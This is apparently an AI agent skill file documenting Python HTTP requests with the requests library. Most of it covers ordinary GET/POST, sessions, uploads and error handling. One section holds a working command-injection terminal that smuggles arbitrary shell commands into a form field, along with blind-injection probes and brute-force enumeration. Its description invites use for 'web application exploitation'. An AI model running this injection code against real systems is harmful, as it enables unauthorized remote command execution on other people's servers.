---
name: python-web-requests
description: Use this skill whenever you need to make HTTP requests in Python, interact with web APIs, test web applications, or automate web interactions. This includes GET/POST requests, file uploads, session management, JSON APIs, security testing, and web application exploitation. Make sure to use this skill when the user mentions HTTP requests, API calls, web scraping, penetration testing, or any Python code that needs to communicate with web services.
---

# Python Web Requests Skill

A comprehensive guide for making HTTP requests in Python using the `requests` library, with patterns for web application testing and security research.

## Quick Start

```python
import requests

# Basic GET request
response = requests.get("https://api.example.com/data")
print(response.status_code)
print(response.text)

# GET with parameters
params = {"key1": "value1", "key2": "value2"}
response = requests.get("https://api.example.com/search", params=params)

# POST with form data
data = {"username": "user", "password": "pass"}
response = requests.post("https://api.example.com/login", data=data)

# POST with JSON
response = requests.post("https://api.example.com/api", json={"query": "data"})
```

## Core Request Patterns

### GET Requests

```python
import requests

url = "http://example.com:80/some/path.php"
params = {"p1": "value1", "p2": "value2"}
headers = {"User-Agent": "Custom Agent", "Accept": "application/json"}
cookies = {"PHPSESSID": "1234567890abcdef"}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

response = requests.get(
    url,
    params=params,
    headers=headers,
    cookies=cookies,
    proxies=proxies,
    verify=False,  # Disable SSL verification (use with caution)
    allow_redirects=True,
    timeout=30
)

# Extract response data
status_code = response.status_code
response_headers = response.headers
body_bytes = response.content
body_text = response.text
response_cookies = response.cookies
is_redirect = response.is_redirect
elapsed_time = response.elapsed.total_seconds()
```

### POST Requests

```python
# Form data POST
response = requests.post(
    url,
    data=params,
    headers=headers,
    cookies=cookies,
    proxies=proxies,
    verify=False,
    allow_redirects=True
)

# JSON POST
response = requests.post(
    url,
    json=params,
    headers={"Content-Type": "application/json"},
    cookies=cookies,
    proxies=proxies
)

# File upload POST
filedict = {
    "file_field_name": (
        "filename.png",
        open("filename.png", 'rb').read(),
        "image/png"
    )
}
response = requests.post(
    url,
    data={"submit": "submit"},
    files=filedict
)
```

## Session Management

Use `requests.Session()` to maintain cookies and connection pooling across multiple requests:

```python
import requests

target = "http://10.10.10.10:8000"
proxies = {}
session = requests.Session()

# Session maintains cookies automatically
def register(username, password):
    resp = session.post(
        target + "/register",
        data={"username": username, "password": password, "submit": "Register"},
        proxies=proxies,
        verify=False
    )
    return resp

def login(username, password):
    resp = session.post(
        target + "/login",
        data={"username": username, "password": password, "submit": "Login"},
        proxies=proxies,
        verify=False
    )
    return resp

def get_info(name):
    resp = session.post(
        target + "/projects",
        data={"name": name},
        proxies=proxies,
        verify=False
    )
    return resp
```

## Common Security Testing Patterns

### Command Injection Testing

```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
    prompt = "Inject => "

    def default(self, args):
        output = run_cmd(args)
        print(output)

def run_cmd(cmd):
    # Inject command between markers
    data = {
        'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"'
    }
    r = requests.post('http://target/select', data=data)
    page = r.text
    
    # Extract output between markers
    m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
    if m:
        return m.group(1)
    else:
        return "No match found"

# Interactive terminal
term = Terminal()
term.cmdloop()
```

### Boolean/Time-Based Injection

```python
import requests
import time

def test_boolean_injection(url, payload):
    """Test for boolean-based blind injection"""
    response = requests.post(url, data=payload, timeout=30)
    # Check for different response sizes or content
    return len(response.content)

def test_time_injection(url, payload, delay=5):
    """Test for time-based blind injection"""
    start = time.time()
    response = requests.post(url, data=payload, timeout=30)
    elapsed = time.time() - start
    return elapsed > delay
```

### Automated Enumeration

```python
import requests
import string
import random

def get_random_string(length=10):
    """Generate random alphanumeric string"""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def enumerate_values(url, param, charset=string.ascii_letters + string.digits, length=10):
    """Enumerate values character by character"""
    result = ""
    for i in range(length):
        for char in charset:
            payload = result + char
            response = requests.post(url, data={param: payload})
            if "success" in response.text.lower():
                result = payload
                print(f"\rFound: {result}", end="")
                break
    return result
```

## Response Handling

```python
# Parse JSON response
response = requests.get("https://api.example.com/data")
data = response.json()

# Check status codes
if response.status_code == 200:
    print("Success")
elif response.status_code == 404:
    print("Not found")
elif response.status_code == 500:
    print("Server error")

# Handle redirects
if response.is_redirect:
    print(f"Redirected to: {response.headers.get('Location')}")

# Access cookies
for cookie in response.cookies:
    print(f"{cookie.name}: {cookie.value}")

# Check response encoding
print(f"Encoding: {response.encoding}")
print(f"Content-Type: {response.headers.get('Content-Type')}")
```

## Error Handling

```python
import requests
from requests.exceptions import RequestException, Timeout, HTTPError

def safe_request(url, **kwargs):
    """Make a request with comprehensive error handling"""
    try:
        response = requests.get(url, timeout=30, **kwargs)
        response.raise_for_status()  # Raise exception for HTTP errors
        return response
    except Timeout:
        print(f"Request to {url} timed out")
        return None
    except HTTPError as e:
        print(f"HTTP error: {e}")
        return None
    except RequestException as e:
        print(f"Request failed: {e}")
        return None
```

## Best Practices

1. **Always set timeouts** - Prevent hanging requests
2. **Use sessions** - For multiple requests to the same host
3. **Handle errors** - Network requests can fail
4. **Validate responses** - Check status codes before processing
5. **Be careful with verify=False** - Only disable SSL verification in controlled environments
6. **Use proxies** - For testing through Burp Suite or similar tools
7. **Respect rate limits** - Add delays between requests if needed

## Common Use Cases

- API testing and automation
- Web application security testing
- Data extraction and scraping
- Authentication flow automation
- File upload testing
- Parameter fuzzing
- Session management
- Proxy-based testing

## Scripts

For repetitive tasks, use the bundled scripts:
- `scripts/make_request.py` - Generic request helper
- `scripts/test_endpoints.py` - Endpoint discovery
- `scripts/extract_data.py` - Data extraction from responses

See the scripts directory for usage examples.
